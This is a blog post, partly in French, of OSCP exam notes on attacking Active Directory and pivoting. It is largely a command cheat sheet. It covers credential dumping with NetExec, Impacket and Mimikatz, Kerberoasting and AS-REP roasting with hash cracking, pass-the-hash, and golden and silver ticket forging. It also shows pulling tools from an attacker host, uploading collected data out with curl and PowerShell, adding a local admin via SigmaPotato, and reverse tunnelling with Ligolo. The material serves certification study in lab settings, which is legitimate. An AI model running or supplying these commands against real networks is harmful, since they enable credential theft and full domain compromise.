# OSCP Notes, Active Directory, and Pivoting Cheat Sheet


![The Husky Hacker|35](https://miro.medium.com/v2/resize:fill:35:35/1*oKMOPLwEuEpKhyrGrWv7Zw.jpeg)


13 min read

·

Feb 20, 2026


![](https://miro.medium.com/v2/resize:fit:764/1*yIRVdfVLR3vEmGhqY414Wg.png)

Active Directory. Non seulement c'est l'élément le plus difficile à défendre, mais c'est aussi l'épine dorsale de votre entreprise. Il a été conçu pour favoriser l'accessibilité et l'interopérabilité à la fin des années 90 et au début des années 2000. Il centralise l'annuaire de l'entreprise ainsi que la gestion des accès aux données et aux utilisateurs. C'est le sésame absolu, les « clés du royaume ». Il est ardu de se défendre face à une architecture intrinsèquement « ouverte par défaut », une surface d'attaque immense et des attaques de type « Living off the Land » (utilisation des outils légitimes du système). Le protocole LDAP révèle la structure du réseau ; les relations d'approbation natives partent du principe que tout ce qui se trouve à l'intérieur du réseau est sûr ; des protocoles non sécurisés comme NTLM et LLMNR sont facilement détournés pour le vol d'identifiants ; des utilisateurs mal configurés peuvent devenir des « administrateurs de l'ombre » (shadow admins) ; sans oublier le Kerberoasting, les GPO mal configurées, DCShadow, etc. La liste est longue. Toutefois, cela peut sembler insurmontable pour ceux qui débutent.

Avant de passer l'OSCP, j'ai passé la certification PJPT de TCM Security pour bien appréhender Active Directory. Cet examen n'était pas aussi difficile que je le pensais, mais les concepts acquis alors me sont utiles pour l'OSCP. Notez cependant qu'il n'y a pas d'attaque par usurpation LLMNR (LLMNR Poisoning) à proprement parler. Vous pouvez tout de même utiliser l'outil Responder, à condition de procéder ainsi :

```bash
sudo responder -I tun0 -A -v 
```

Tant que vous utilisez l'option `-A`, toutes les fonctionnalités de « posing » seront désactivées. Sinon, vous pouvez aussi modifier le fichier avec `nano`. Je sais qu'il faut savoir s'en servir pour réussir le PJPT. Il s'agit d'une épreuve d'énumération ; vous pouvez donc l'utiliser, même si ce n'est pas forcément indispensable. Gardez cette option sous le coude.

Ce qui rend cet examen si difficile, c'est qu'il mobilise plusieurs compétences simultanément. Vous ne vous contentez pas d'exploiter une seule faille : vous évoluez au sein d'un **écosystème** complet (abus d'OU, mauvaise gestion des utilisateurs, etc.).

Host → User → Group → Domain → Policies → Protocols → Trusts  
  
Dans les laboratoires OSCP, la chaîne d'exploitation Active Directory (AD) est complexe car elle nécessite de :

- Énumérer les utilisateurs
- Énumérer les permissions
- Comprendre les appartenances aux groupes
- Repérer les attributions de privilèges subtiles
- Identifier les mauvaises configurations sur plusieurs machines

Vous avez une série d'étapes à suivre. Vous pourriez obtenir (ou non) les identifiants d'un utilisateur. Selon la situation, appliquez ces règles :

```markdown
**Règle n°1 :**
Partez du principe que vous disposez d'un accès anonyme ou « invité ». Tant que vous n'avez pas exécuté `nxc` et obtenu un utilisateur, considérez qu'il s'agit d'une mauvaise configuration, jusqu'à preuve du contraire.

**Règle n°2 :**
Si vous obtenez un utilisateur, testez tout, consignez les informations dans BloodHound et énumérez cet utilisateur. C'est un indice très précieux.

**Règle n°3 :**
La chaîne d'exploitation suit les postes Windows ; si vous obtenez un utilisateur et un accès, examinez les vecteurs d'élévation de privilèges sous Windows. Il faudra peut-être d'abord obtenir un accès local.

**Règle n°4 :**
UTILISATEUR À FAIBLES PRIVILÈGES
↓
Trouver un privilège inhabituel ou une mauvaise configuration
↓
Exploiter ce privilège pour passer à un compte plus privilégié
↓
Accéder à une machine ou un service plus sensible
↓
Énumérer à nouveau (les permissions changent !)
↓
Trouver la prochaine mauvaise configuration
↓
Répéter l'opération jusqu'à obtenir les droits d'Administrateur du domaine (Domain Admin)

**Règle n°5 :**
Posez-vous la question : pourquoi ai-je accès à ceci ? Ré-énumérez et relisez vos notes sur l'utilisateur.
« Qui est-ce que je contrôle ? » 
« Que peut faire cet objet que je ne pouvais pas faire auparavant ? »
« Qui cela affecte-t-il ? »

**Règle n°6 :**
Considérez cela comme n'importe quelle autre machine HTB ou Proving Grounds. Ce n'est pas le monde réel.
Pensez aux différentes méthodes d'énumération rapides. Vous n'aurez peut-être même pas besoin d'utiliser Mimikatz (bien que je le recommanderais tout de même). 

**Règle numéro sept :**
Si un nouveau compte vous confère :

- Une nouvelle autorisation
- Un nouveau SPN
- Une nouvelle appartenance à un groupe
- Une nouvelle GPO
- L'accès à une nouvelle machine

**Règle numéro huit :**
Mauvaises configurations Kerberos

SPN mal configurés
Délégation faible ou inattendue
Comptes autorisés à usurper l'identité d'autres utilisateurs
Utilisateurs possédant des SPN alors qu'ils ne devraient pas en avoir

**Règle numéro neuf :**
L'examen OSCP ne cherche pas à vous piéger ; il vise à vérifier si vous savez distinguer
le signal du bruit.

Quels objets AD sont importants
Quelles autorisations impliquent réellement une élévation de privilèges
Ce qui peut être ignoré


**Règle numéro dix :**
L'examen évalue votre capacité à enchaîner plusieurs petites réussites, et non à trouver une
seule vulnérabilité majeure.

**Règle numéro onze :**
Élévation de privilèges dans Active Directory :

« Cet utilisateur peut réinitialiser le mot de passe de cet autre utilisateur »
« Ce groupe dispose du droit GenericWrite sur cet objet »
« Ce compte machine peut ajouter un nouveau SPN »
« Cette GPO s'applique à un emplacement inattendu »

**Règle numéro douze :**
Récupérer des hashs est acceptable et l'attaque « Pass-the-Hash » est plus rapide ; pensez simplement à la tester au préalable. 
```

Exploitez les vecteurs d'attaque à votre avantage :


Utilisateur à faibles privilèges
↓
Découverte : l'utilisateur possède le droit GenericWrite sur un autre utilisateur
↓
Cet utilisateur possède un SPN ou des droits spécifiques
↓
Ce compte peut gérer un service ou une machine
↓
Les permissions sur la machine mènent à un accès au contrôleur de domaine (DC)
↓
Administrateur du domaine


Risque lié aux GPO :
Utilisateur à faibles privilèges
↓
L'utilisateur peut modifier une GPO
↓
La GPO s'applique à un serveur ou à un utilisateur privilégié
↓
Élévation de privilèges lors de la connexion de cet utilisateur
↓
L'accès au serveur mène finalement au contrôleur de domaine
↓
Administrateur du domaine

Compte machine :
Utilisateur à faibles privilèges
↓
Compromission d'un compte machine
↓
La machine possède des droits inattendus sur l'objet contrôleur de domaine
↓
Élévation de privilèges via la chaîne d'ACL
↓
Administrateur du domaine

# Liste de contrôle pour l'énumération :

☐ Scanner tous les ports TCP
☐ Scanner les ports UDP (Kerberos = UDP/88, DNS = UDP/53, etc.)
☐ Identifier le domaine via SMB, les bannières LDAP ou les métadonnées RPC
☐ Vérifier la présence d'un accès anonyme sur :

SMB
	- LDAP
	- RPC
	- Messages d'erreur WinRM
	- Connexion MSSQL sans authentification (null connect)

☐ Énumérer les partages SMB publics

☐ Collecter les noms d'utilisateur via :

	Attaque par force brute sur les RID
	Commande `rpcclient enumdomusers`
	Sessions SMB NULL
	Énumération des objets AD via LDAP anonyme (si autorisé)

☐ Valider les noms d'utilisateur (sans risque) :

	`kerbrute userenum` (compréhension conceptuelle uniquement)

☐ Rechercher des utilisateurs ayant des attributs descriptifs (descriptions, initiales, notes)

☐ Tester la vulnérabilité AS-REP (ASREProasting) avec les noms d'utilisateur collectés
☐ Tenter l'analyse des tickets de service Kerberos (concept de Kerberoasting) une fois les identifiants valides obtenus
☐ Tester les identifiants sur différents protocoles :

SMB
		- LDAP
		- RDP
		- WinRM
		- MSSQL
		- RPC

☐ Noter les protocoles renvoyant « accès refusé » par rapport à « identifiants invalides »
(très (signal important)

☐ Pour CHAQUE nouvelle paire d'identifiants, ré-énumérer :

Partages SMB
		- Liens symboliques
		- Scripts GPO
		- Fichiers de configuration
		- Fichiers de mots de passe
		- Restes d'installation
		- Sauvegardes
		- Exposition de données LAPS

☐ Rechercher :

	Identifiants dans des fichiers
	Scripts intéressants
	Tâches planifiées
	Scripts SYSVOL et fichiers GPO accessibles

☐ Vérifier les erreurs de configuration à l'aide d'outils d'énumération AD (approche conceptuelle) :

	GenericWrite / GenericAll
	WriteOwner
	WriteDACL
	Droits ResetPassword
	Exposition des permissions LAPS
	Droits de modification GPO

☐ Vérifier la délégation (concept) :

	Non contrainte
	Contrainte
	Délégation contrainte basée sur les ressources

☐ Vérifier si des utilisateurs possèdent :

	Des SPN qu'ils ne devraient pas avoir
	Des privilèges de compte machine
	Des droits de réinitialisation de mot de passe sur des utilisateurs à privilèges élevés

☐ Téléverser des données (approche conceptuelle sûre)
  
☐ Qui je suis?  
☐ A quel groupe j'appartiens?  
☐ Est-ce que je dispose de privilèges de jeton ?
  
	SeImpersonate  
	SeBackup  
	SeRestore  
	SeDebug  
	SeLoadDriver  
☐ Writable service binaries  
☐ Writable service directories  
☐ Writable service registry keys  
☐ Missing service binaries  
☐ Unquoted service paths  
☐ Tasks owned by SYSTEM  
☐ Writable paths  
☐ Broken/missing executables  
☐ Tasks running scripts from user-writable locations  
☐ Weak permissions on:  
  
	Services  
	Run keys  
	Startup keys  
	AlwaysInstallElevated (concept only)  
☐ Writable directories in PATH  
☐ Writable files owned by privileged users  
☐ Program Files subdirectories with incorrect ACLs  
☐ Outdated software  
☐ Backup installers lying around  
☐ Applications running with elevated privileges  
☐ PATH injection  
☐ Writable temp paths  
☐ Writable referenced directories  
☐ Credentials in:  
  
	Config files  
	Web.config  
	.ini files  
	Scripts  
	Backups  
	IIS configs  
  
☐ Search recent files, logs  
☐ Open ports internally  
☐ Services running as SYSTEM  
☐ Misconfigured internal web apps  
☐ Re-enumerate EVERYTHING  
☐ New permissions mean new attack surface  
☐ Re-scan internal ports  
☐ Re-check local groups  
☐ Re-check registry permissions  
☐ Re-check services

# Combined AD + Windows PrivEsc Logic (OSCP Winning Formula):

- Obtenir un accès initial (Web, SMB, RDP, WinRM).
- Énumérer les identifiants et les données AD.
- Tester les identifiants sur différents protocoles et machines.
- Obtenir un accès utilisateur ou un compte machine.
- Renouveler l'énumération.
- Analyse avec BloodHound.
- Identifier un chemin d'attaque lié à une mauvaise configuration.
- Effectuer un déplacement latéral.
- Énumérer les éléments locaux Windows pour l'élévation de privilèges.
- Élever les privilèges au niveau administrateur.
- Extraire de nouveaux identifiants.
- Répéter l'opération à l'échelle du domaine.
- Finalement, obtenir les droits d'administrateur du domaine (approche conceptuelle).

Cette méthode ne conviendra peut-être pas à tout le monde, mais tenez-vous-en à un processus qui vous aide à rester responsable. Établissez une liste de contrôle et prenez votre temps.


## Welcome | NetExec

Netexec et crackmapexec sont vos meilleurs outils pour énumérer et valider des comptes auprès de services tels que LDAP, RDP, SMB, WinRM, etc. Je consulte souvent cette page wiki, ainsi que les commandes :

```
netexec smb $target -u  ‘’ -p ‘’ --shares  
netexec smb $target -u ‘’ -p  ‘’ --rid-brute  
netexec smb $target -u ‘’ -p ‘’ --pass-pol  
nxc smb <target> -u <user> -p <pass> --local-auth  
nxc smb <target> -u <user> -p <pass> --groups  
nxc smb <target> -u <user> -H <hash>   
nxc smb <target> -u <user> -p <pass> --sam  
nxc smb <target> -u <user> -p <pass> --lsa  
nxc smb <target> -u <user> -p <pass> --ntds  
crackmapexec smb <target> -u 'guest' -p '' --shares -> same as nxc  
  
nxc ldap $ip -u $user -p $password --users  
nxc ldap $ip -u $user -p $password --groups  
nxc ldap $ip -u $user -p $password --query "(sAMAccountName=Administrator)" "sAMAccountName objectClass"  
nxc ldap domain -u username -p password --gmsa  

Le protocole LDAP peut être utilisé en combinaison avec des options telles que --kerberoasting et --no-preauth-targets.
  
nxc rdp $target -u user -p password  
--no-bruteforce  
  
nxc winrm <target> -u <user> -p <password> -x "whoami"  
nxc winrm <target> -u <user> -H <ntlm_hash>  
  
nxc winrm <target> -u <user> -p <password> -X 'powershell -c "Get-Process"'
```

Il est préférable d'effectuer une énumération aussi complète que possible avant de lancer des attaques, car un utilisateur peut ne pas disposer de droits SMB tout en ayant accès au RDP (pour prendre un exemple simple).

BloodHound devrait également figurer sur la liste, car vous devez savoir quels utilisateurs disposent d'un accès et comment se déplacer latéralement.

## 2 - Bloodhound

### BloodHound est un outil polyvalent et puissant pour l'énumération et l'analyse d'Active Directory.

https://www.youtube.com/embed/RmElkmTEzKw?wmode=opaque&widget_referrer=https%3A%2F%2Fmedium.com%2F&enablejsapi=1&origin=https%3A%2F%2Fcdn.embedly.com&widgetid=1&forigin=https%3A%2F%2Fcdn.embedly.com%2Fwidgets%2Fmedia.html%3Fsrc%3Dhttps%253A%252F%252Fwww.youtube.com%252Fembed%252FRmElkmTEzKw%253Ffeature%253Doembed%26display_name%3DYouTube%26url%3Dhttps%253A%252F%252Fwww.youtube.com%252Fwatch%253Fv%253DRmElkmTEzKw%26image%3Dhttps%253A%252F%252Fi.ytimg.com%252Fvi%252FRmElkmTEzKw%252Fhqdefault.jpg%26type%3Dtext%252Fhtml%26schema%3Dyoutube&aoriginsup=0&gporigin=https%3A%2F%2Fmedium.com%2F&vf=5

https://www.youtube.com/watch?v=whTdMlJGViM


These ways are great for installing it. Follow the steps to the tee. You can also use the Docker version:

Blood hound:  
  
bloodhound-python -u "user" -p 'pass' -d domain -c all --zip -ns $target  
  
Docker  
curl -L https://ghst.ly/getbhce -o docker-compose.yml  
sudo docker-compose pull && sudo docker-compose up -d   
sudo docker-compose logs bloodhound | grep -i passw  
  
Then go to with the password:  
http://127.0.0.1:8080 admin : password  
  
It may ask to change

You really need this tool to pass. Run bloodhound-python first:

bloodhound-python -u "user" -p 'pass' -d domain -c all --zip -ns $target  
  
or you my need to be on a windows pc, run in windows powershell:  
Invoke-BloodHound -CollectionMethod All -ZipFileName file.zip.  
  
Then extract   
curl -T C:\path\to\file.txt http://linux-ip:<port>/  
Invoke-WebRequest -Uri http://linux-ip/upload -Method Put -InFile C:\path\to\file.txt  
either way works  
  

Then upload that data and let it ride. Once done, you can check for the OU’s, User, etc.

Example:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:764/0*obQzhQefPYWRpRo0.png)

It’s evolved a bit, but the same practice goes on. You have a user in the AD group you want to get after. This will help with that.

## Get The Husky Hacker’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Impacket:

[

## Impacket | Hackviser

### Impacket tool guide; includes tool's purpose, primary uses, core features, data sources, common commands, and examples of…

hackviser.com



](https://hackviser.com/tactics/tools/impacket?source=post_page-----af42c46fd67b---------------------------------------)

After you compromise a user, the next step is impacket/netexec. So let’s say you find a user in an interesting group; now you can do more kerberoasting, ASREP roasting, dumping creds, etc.

impacket-GetADUsers -all <domain>/<username>:<password>  
impacket-GetADComputers -dc-ip <DC_IP> <domain>/<username>:<password>  
impacket-secretsdump -just-dc <domain>/<admin_user>:<password>@<DC_IP>  
impacket-GetUserSPNs -request -dc-ip <DC_IP> <domain>/<user>  
impacket-GetUsersSPNs domain.local/user:password  
  
impacket-GetNPUsers domain.local -userfile users.txt -format hashcat -outputfile asrep_hash.txt  
then crack with hashcat or john  
john --formate=krb5asrep hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  
hashcat 18200 asrep_hashes.txt  /usr/share/wordlists/rockyou.txt --force  
  
Pass-the-Hash:   
impacket-psexec -hashes <LM>:<NT> <domain>/<user>@<target_IP>  
evil-winrm -i $target -u Adminstrator -H hash  
  
  
One big tip! With winrm, you can download older SAM and SYSTEM files.   
download C:/*/Windows/system32/SAM  
download C:/*/Windows/system32/SYSTEM  
Then run   
impacket-secretsdump -sam SAM -system SYSTEM LOCAL  
  
Also with winrm, you can run curl:  
curl http://<ip>/file.exe -o file.exe --> eaiser file transfer  
evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> 

These will get you by for what you need to use for AD. However, Mimikatz is also a great tool for these attacks, as well as its own attacks.

[

## GitHub - ParrotSec/mimikatz

### Contribute to ParrotSec/mimikatz development by creating a GitHub account.



](https://github.com/ParrotSec/mimikatz?source=post_page-----af42c46fd67b---------------------------------------)

[

## Mimikatz | Hackviser

### Mimikatz tool guide; includes the tool's purpose, primary use s,core featur es,data sources, common comm,andsexamplesample of…

hackviser.com



](https://hackviser.com/tactics/tools/mimikatz?source=post_page-----af42c46fd67b---------------------------------------)

share it:  
python3 -m http.server 80  
certutil.exe -urlcache -f http://<your_ip>/mimikatz.exe mimikatz.exe  
.\mimikatz.exe  
privilege::debug  
lsadump::sam  
Gets hashes   
  
sekurlsa::logonpasswords  
  
  
pass the ticket:  
sekurlsa::tickets  
kerberos::list /export  
kerberos::ptt <ticket.kribi>   
to check tickets:  
kerberos::list  
  
golden ticket attack:  
lsadump::lsa /inject /name:krbtgt  
lsadump::dcsync /user:DOMAIN\krbtgt  
kerberos::golden /user:FakeAdmin /domain:target.local /sid:S-1-5-21-xxxx /krbtgt:hash_here /id:500 /groups:512 /ptt  
kerberos::list   
misc::cmd or   
dir \\dc01.target.local\c$  
  
Sliver ticket attack:  
kerberos::golden /domain:domain.com /sid:S-1-5-21-... /target:TargetServer.domain.com /service:cifs /rc4:NTLMHash /user:Administrator /ptt  
kerberos::golden /domain:domain.com /sid:S-1-5-21-... /target:TargetServer.domain.com /service:host /rc4:NTLMHash /user:Administrator /ptt  
kerberos::golden /domain:domain.com /sid:S-1-5-21-... /target:SQLServer.domain.com /service:mssql /rc4:ServiceAccountHash /user:Administrator /ptt

Rubues is another great tool for this as well:

[https://www.hackingarticles.in/a-detailed-guide-on-rubeus/](https://www.hackingarticles.in/a-detailed-guide-on-rubeus/)

[

## GitHub - r3motecontrol/Ghostpack-CompiledBinaries: Compiled Binaries for Ghostpack

### Compiled Binaries for Ghostpack. Contribute to r3motecontrol/Ghostpack-CompiledBinaries development by creating an…

github.com



](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries?source=post_page-----af42c46fd67b---------------------------------------)

./Rubeus.exe kerberoast /nowrap

Pass the ticket:

[

## Pass the Ticket | Pentest Everything

### https://attack.mitre.org/techniques/T1550/003/

viperone.gitbook.io



](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/lateral-movement/alternate-authentication-material/wip-pass-the-ticket?source=post_page-----af42c46fd67b---------------------------------------)

[

## Pass the ticket | The Hacker Recipes

### MITRE ATT&CK™ Sub-technique T1550.003

www.thehacker.recipes



](https://www.thehacker.recipes/ad/movement/kerberos/ptt?source=post_page-----af42c46fd67b---------------------------------------)

You can also run this with Wine on, like. Like kurbrute. Speaking of:

[

## A Detailed Guide on Kerbrute

### Discover how to use Kerbrute for Active Directory testing, including user enumeration and password attacks. Learn how…

www.hackingarticles.in



](https://www.hackingarticles.in/a-detailed-guide-on-kerbrute/?source=post_page-----af42c46fd67b---------------------------------------)

Follow this guide as well. One big tip I also have:

[

## GitHub - tylerdotrar/SigmaPotato: SeImpersonate privilege escalation tool for Windows 8 - 11 and…

### SeImpersonate privilege escalation tool for Windows 8 - 11 and Windows Server 2012 - 2022 with extensive PowerShell and…

github.com



](https://github.com/tylerdotrar/SigmaPotato?utm_source=hackdb.com&utm_medium=referral&utm_campaign=navigation&source=post_page-----af42c46fd67b---------------------------------------)

Sigma potato!! Like god potato, you can use this to make a local user a local admin with impersonation enabled.

.\sp.exe "net localgroup administrators user /add" 

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:764/1*F1Y9BH9C3wDQkEQZET4AmA.png)

Pivoting on the oscp can be difficult, but two tools that I love to use are simple: Ligolo and Chisel. This part is up to you; it's subjective, but you need to pivot to pass.

[

## GitHub - jpillora/chisel: A fast TCP/UDP tunnel over HTTP

### A fast TCP/UDP tunnel over HTTP. Contribute to jpillora/chisel development by creating an account on GitHub.

github.com



](https://github.com/jpillora/chisel?source=post_page-----af42c46fd67b---------------------------------------)

[

## Pivoting and Portforwarding | Pentest Everything

### Change last line in /etc/proxychains4.conf to the following value: socks5 127.0.0.1 1080 Then use the following…

viperone.gitbook.io



](https://viperone.gitbook.io/pentest-everything/everything/pivoting-and-portforwarding?source=post_page-----af42c46fd67b---------------------------------------)

[

## GitHub - nicocha30/ligolo-ng: An advanced, yet simple, tunneling/pivoting tool that uses a TUN…

### An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface. - nicocha30/ligolo-ng

github.com



](https://github.com/nicocha30/ligolo-ng?source=post_page-----af42c46fd67b---------------------------------------)

[

## How to Tunnel and Pivot Networks using Ligolo-ng

### On my journey to take on the OSCP I learned that pivoting/tunneling can be a confusing concept at first for beginners…

software-sinner.medium.com



](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740?source=post_page-----af42c46fd67b---------------------------------------)

[

## A Detailed Guide on Ligolo-Ng

### Learn how to use Ligolo-Ng for lateral movement, tunneling, and pivoting across networks in penetration testing labs.

www.hackingarticles.in



](https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/?source=post_page-----af42c46fd67b---------------------------------------)

These are great for understanding the method and the detailed instructions for doing it. They would explain it better than I would, but this is an open-note test.

So huge tip: use what you like, know what will work on the OSCP exam, and do the labs to get a feel for pivoting. The concept, though, is the same:

You compromise a Windows or Linux machine  
You run ipconfig or ifconfig and see multiple NICs or subnets  
Example:  
10.10.10.50/24   ← the subnet you already know about  
172.16.5.20/24   ← NEW hidden internal subnet  
  
You can't reach 172.16.5.0/24 directly from Kali…  
…but the compromised machine can.  
  
Identify that 10.1.50.0/24 is hidden  
Set up a SOCKS proxy through the compromised host  
Use proxychains to run(for chisel):  
   
nmap  
rpcclient  
smbclient  
ldapwhoami  
bloodhound-python  
  
  
  
That’s OSCP pivoting in a nutshell.  
  
I perfer ligolo, though, its super simple:  
sudo ./proxy -selfcert --> if it asked to install, install,   
rerun after install  
  
On victim:  
echo $env:PROCESSOR_ARCHITECTURE --> check the agent you need  
  
Huge difference between AMD and ARM  
  
.\agent1.exe -connect <kali_ip>:11601 -ignore-cert --> windows  
Get-Item .\agent.exe | select Length --> incase you need to trouble shoot  
  
  
Then on your pc:  
session   
1  
ifconfig  
autoroute  
select all   
yes

![](https://miro.medium.com/v2/resize:fit:731/1*kGQn9MofdRvB9t8leoYTvA.png)

It’s that easy. I really have to thank the creator for this tool. But also my go to.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:764/1*vL-Szhe9H_IlBhN3tw9DmQ.png)

That pretty much wraps up all the notes for the OSCP. Take what you learned here, run it in your own lab, break things, fix them, and break them again — that’s how real growth happens. And when you hit those inevitable walls? Perfect. That means you’re exactly where you’re supposed to be. That’s where we’ll call it before your brain starts blue‑screening like an overworked domain controller. Remember: the OSCP grind isn’t glamorous. It’s 3 a.m. terminal staring, copy‑pasting hashes with trembling hands, drinking coffee you _swear_ you poured five minutes ago but is somehow ice cold, and watching BloodHound draw a path so long you start questioning all your life choices. However, you got this. I hope this series is helpful. Thank you for reading.